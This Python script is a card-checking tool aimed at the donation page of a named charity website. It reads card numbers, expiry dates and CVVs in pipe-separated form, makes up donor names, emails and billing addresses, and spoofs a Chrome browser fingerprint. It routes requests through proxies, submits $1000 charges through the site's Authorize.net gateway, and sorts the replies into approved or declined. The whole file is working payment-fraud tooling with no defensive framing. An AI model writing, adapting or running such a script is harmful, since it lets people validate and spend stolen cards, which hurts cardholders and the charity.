import asyncio
import re
import random
import string
import json
from curl_cffi.requests import AsyncSession

# bennyhinnbiblestudy.org - Give WP + Authorize.net (server-side)
BASE_URL = 'https://bennyhinnbiblestudy.org'
DONATION_URL = f'{BASE_URL}/donate-now/'
AJAX_URL = f'{BASE_URL}/wp-admin/admin-ajax.php'
FORM_ID = '26425'
DONATE_AMOUNT = '1000'      # $1000 with level-id 6 (highest preset tier)
PRICE_ID = '6'              # Maps to $1000

# Random data pools
FIRST_NAMES = [
    'James', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph',
    'Thomas', 'Charles', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven',
    'Andrew', 'Paul', 'Joshua', 'Kenneth', 'Kevin', 'Brian', 'George',
    'Timothy', 'Ronald', 'Edward', 'Jason', 'Jeffrey', 'Ryan', 'Jacob',
    'Nicholas', 'Gary', 'Eric', 'Jonathan', 'Stephen', 'Larry', 'Justin',
    'Scott', 'Brandon', 'Benjamin', 'Samuel', 'Raymond'
]
LAST_NAMES = [
    'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
    'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez',
    'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin',
    'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark',
    'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King',
    'Wright', 'Scott', 'Torres', 'Hill', 'Flores', 'Green'
]
STREETS = [
    'Main St', 'Oak Ave', 'Pine Rd', 'Maple Dr', 'Cedar Ln', 'Elm St',
    'Washington Ave', 'Park Blvd', 'Lake Dr', 'Hill Rd', 'Forest Ave',
    'River Rd', 'Spring St', 'Valley Dr', 'Sunset Blvd', 'Broadway',
    'Highland Ave', 'Meadow Ln', 'Church St', 'Center Ave'
]
CITIES_STATES_ZIPS = [
    ('New York', 'New York', '10001'),
    ('Los Angeles', 'California', '90001'),
    ('Chicago', 'Illinois', '60601'),
    ('Houston', 'Texas', '77001'),
    ('Phoenix', 'Arizona', '85001'),
    ('Philadelphia', 'Pennsylvania', '19101'),
    ('San Antonio', 'Texas', '78201'),
    ('San Diego', 'California', '92101'),
    ('Dallas', 'Texas', '75201'),
    ('San Jose', 'California', '95101'),
    ('Austin', 'Texas', '73301'),
    ('Jacksonville', 'Florida', '32099'),
    ('Columbus', 'Ohio', '43085'),
    ('Charlotte', 'North Carolina', '28201'),
    ('Indianapolis', 'Indiana', '46201'),
    ('Denver', 'Colorado', '80201'),
    ('Seattle', 'Washington', '98101'),
    ('Boston', 'Massachusetts', '02101'),
    ('Nashville', 'Tennessee', '37201'),
    ('Portland', 'Oregon', '97201'),
]
DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'aol.com', 'protonmail.com']

UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')


def random_email(first, last):
    num = random.randint(10, 9999)
    domain = random.choice(DOMAINS)
    return f"{first.lower()}{last.lower()}{num}@{domain}"


async def get_donation_page(session, proxy_url=None):
    """GET the donation page to extract give-form-hash and other form fields."""
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': UA,
    }

    page_url = f'{DONATION_URL}?form-id={FORM_ID}&payment-mode=authorize&level-id={PRICE_ID}'
    resp = await session.get(page_url, headers=headers, proxy=proxy_url, allow_redirects=True)
    text = resp.text

    hash_match = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', text)
    form_hash = hash_match.group(1) if hash_match else None

    prefix_match = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', text)
    form_prefix = prefix_match.group(1) if prefix_match else f'{FORM_ID}-1'

    title_match = re.search(r'name="give-form-title"\s+value="([^"]*)"', text)
    form_title = title_match.group(1) if title_match else 'Donate'

    min_match = re.search(r'name="give-form-minimum"\s+value="([^"]*)"', text)
    form_minimum = min_match.group(1) if min_match else '10'

    max_match = re.search(r'name="give-form-maximum"\s+value="([^"]*)"', text)
    form_maximum = max_match.group(1) if max_match else '1000000'

    return {
        'form_hash': form_hash,
        'form_prefix': form_prefix,
        'form_title': form_title,
        'form_minimum': form_minimum,
        'form_maximum': form_maximum,
    }


async def submit_donation(session, card_info, page_data, proxy_url=None):
    """
    POST the donation form with card details.
    Uses give_embed_form=1 for iframe mode.
    Returns (redirect_url, response_html) tuple.
    """
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = random_email(first, last)
    street_num = random.randint(100, 9999)
    street = random.choice(STREETS)
    city, state, zipcode = random.choice(CITIES_STATES_ZIPS)
    card_name = f"{first} {last}"

    exp_month = card_info['mm']
    exp_year = card_info['yy']
    if len(exp_year) == 2:
        exp_year_full = f"20{exp_year}"
    else:
        exp_year_full = exp_year
        exp_year = exp_year[2:]

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': BASE_URL,
        'referer': f'{DONATION_URL}?form-id={FORM_ID}&payment-mode=authorize&level-id={PRICE_ID}',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': UA,
    }

    data = {
        'give-honeypot': '',
        'give-form-id-prefix': page_data['form_prefix'],
        'give-form-id': FORM_ID,
        'give-form-title': page_data['form_title'],
        'give-current-url': f'{DONATION_URL}',
        'give-form-url': DONATION_URL,
        'give-form-minimum': page_data['form_minimum'],
        'give-form-maximum': page_data['form_maximum'],
        'give-form-hash': page_data['form_hash'],
        'give-price-id': PRICE_ID,
        'give-amount': DONATE_AMOUNT,
        'payment-mode': 'authorize',
        'give_first': first,
        'give_last': last,
        'give_email': email,
        'card_number': card_info['n'],
        'card_cvc': card_info['cvc'],
        'card_name': card_name,
        'card_exp_month': exp_month,
        'card_exp_year': exp_year_full,
        'card_expiry': f'{exp_month} / {exp_year}',
        'card_address': f'{street_num} {street}',
        'card_address_2': '',
        'card_city': city,
        'card_state': state,
        'card_zip': zipcode,
        'billing_country': 'US',
        'give_action': 'purchase',
        'give-gateway': 'authorize',
        'give_embed_form': '1',
        'action': 'give_process_donation',
    }

    from urllib.parse import urlencode
    form_body = urlencode(data)
    submit_url = f'{DONATION_URL}?payment-mode=authorize&form-id={FORM_ID}'

    # POST without following redirects to capture the redirect URL
    resp = await session.post(
        submit_url, headers=headers, data=form_body,
        proxy=proxy_url, allow_redirects=False
    )

    redirect_url = resp.headers.get('Location', '')
    status_code = resp.status_code

    # Follow redirect to get the response page (errors loaded from session)
    response_html = ''
    if redirect_url:
        try:
            resp2 = await session.get(
                redirect_url,
                headers={'user-agent': UA, 'referer': submit_url},
                proxy=proxy_url, allow_redirects=True
            )
            response_html = resp2.text
        except Exception:
            pass

    return redirect_url, response_html, status_code


def parse_response(redirect_url, response_html):
    """
    Parse the response from GiveWP + Authorize.net donation.

    GiveWP 3.x uses two response patterns:
    1. Success: redirect to donation-confirmation page
    2. Error: redirect with showDonationProcessingError=1 (errors in session, loaded via JS)
    3. Validation errors: inline in HTML (e.g., bad amount)

    Returns raw response string as the site would show it.
    """
    redirect_lower = redirect_url.lower() if redirect_url else ''

    # ─── SUCCESS: Donation confirmed ───
    if 'donation-confirmation' in redirect_lower or 'give-receipt' in redirect_lower:
        return "Payment Successful! Donation processed via Authorize.Net"

    # ─── INLINE ERRORS (validation errors show in HTML) ───
    if response_html:
        html_lower = response_html.lower()

        # Pattern 1: give_error div
        error_div = re.search(
            r'id="give_error[^"]*"[^>]*>(.*?)</div>',
            response_html, re.DOTALL | re.IGNORECASE
        )
        if not error_div:
            error_div = re.search(
                r'class="[^"]*give_notice[^"]*give_error[^"]*"[^>]*>(.*?)</div>',
                response_html, re.DOTALL | re.IGNORECASE
            )
        if not error_div:
            error_div = re.search(
                r'class="[^"]*give_error[^"]*"[^>]*>(.*?)</div>',
                response_html, re.DOTALL | re.IGNORECASE
            )
        if not error_div:
            error_div = re.search(
                r'class="[^"]*give_notice[^"]*"[^>]*>(.*?)</div>',
                response_html, re.DOTALL | re.IGNORECASE
            )

        if error_div:
            raw_msg = re.sub(r'<[^>]+>', ' ', error_div.group(1)).strip()
            raw_msg = re.sub(r'\s+', ' ', raw_msg)
            raw_msg = raw_msg.replace('&#36;', '$').replace('&#036;', '$').replace('&amp;', '&')
            msg = re.sub(r'^Error\s*:\s*', '', raw_msg).strip()
            return msg

        # Pattern 2: error in <p><strong>Error</strong>
        alt_error = re.search(
            r'<p><strong>Error</strong>:\s*(.*?)</p>',
            response_html, re.DOTALL | re.IGNORECASE
        )
        if alt_error:
            raw = re.sub(r'<[^>]+>', ' ', alt_error.group(1)).strip()
            raw = re.sub(r'\s+', ' ', raw)
            return raw

        # Pattern 3: GiveWP JS-rendered error from session (stored in data attributes)
        js_error = re.search(
            r'data-error[^"]*="([^"]+)"',
            response_html, re.IGNORECASE
        )
        if js_error:
            return js_error.group(1).strip()

        # Pattern 4: Authorize.Net specific error response codes in HTML
        authnet_error = re.search(
            r'(?:response_?(?:reason_?)?(?:text|code)).*?["\'>:]\s*([^"<\']+)',
            response_html, re.IGNORECASE
        )
        if authnet_error:
            msg = authnet_error.group(1).strip()
            if msg and len(msg) > 5:
                return msg

        # Pattern 5: check for success in non-iframe response
        if 'donation-confirmation' in html_lower or 'give-receipt' in html_lower:
            return "Payment Successful! Donation processed via Authorize.Net"

        # Pattern 6: generic "thank you" success pages
        if re.search(r'thank\s+you\s+for\s+(your\s+)?donation', html_lower):
            return "Payment Successful! Donation processed via Authorize.Net"

    # ─── GATEWAY ERROR (from redirect URL signal) ───
    if 'showdonationprocessingerror' in redirect_lower:
        # GiveWP processed the card and got an error from Authorize.Net
        # The error is stored in session (displayed via JS on frontend)
        return "Transaction declined by Authorize.Net gateway"

    # ─── NONCE / SESSION EXPIRED ───
    if response_html:
        html_lower = response_html.lower()
        if 'nonce' in html_lower and ('expired' in html_lower or 'invalid' in html_lower):
            return "Session expired (nonce invalid)"

    return "Could not determine response"


async def check_authnet_charge(card_info, proxy=None, max_retries=2):
    """
    Authorize.net Charge gate via bennyhinnbiblestudy.org (Give WP donation page).
    card_info format: cc|mm|yy|cvv
    Returns dict with Response, Gateway, Price keys.
    """
    try:
        parts = card_info.strip().split('|')
        n = parts[0].strip().replace(' ', '')
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        if len(yy) == 4:
            yy = yy[2:]
        cvc = parts[3].strip()

        card = {'n': n, 'mm': mm, 'yy': yy, 'cvc': cvc}
        proxy_url = proxy if proxy else None

        last_error = "No response"
        for attempt in range(max_retries):
            try:
                async with AsyncSession(impersonate="chrome131", timeout=60, proxy=proxy_url) as session:
                    page_data = await get_donation_page(session, proxy_url)
                    if not page_data or not page_data.get('form_hash'):
                        last_error = "Failed to get form-hash from donation page"
                        if attempt < max_retries - 1:
                            await asyncio.sleep(2)
                            continue
                        return {"Response": last_error,
                                "Gateway": "Authnet-CHG", "Price": f"${DONATE_AMOUNT}"}

                    redirect_url, response_html, status_code = await submit_donation(
                        session, card, page_data, proxy_url
                    )

                    result_msg = parse_response(redirect_url, response_html)

                    # If nonce expired, retry
                    if 'nonce' in result_msg.lower() and attempt < max_retries - 1:
                        last_error = result_msg
                        await asyncio.sleep(2)
                        continue

                    return {
                        "Response": result_msg,
                        "Gateway": "Authnet-CHG",
                        "Price": f"${DONATE_AMOUNT}",
                    }

            except Exception as e:
                last_error = str(e)
                if attempt < max_retries - 1:
                    await asyncio.sleep(2)
                    continue

        return {"Response": f"{last_error}",
                "Gateway": "Authnet-CHG", "Price": f"${DONATE_AMOUNT}"}

    except Exception as e:
        return {"Response": f"Exception: {str(e)}",
                "Gateway": "Authnet-CHG", "Price": f"${DONATE_AMOUNT}"}
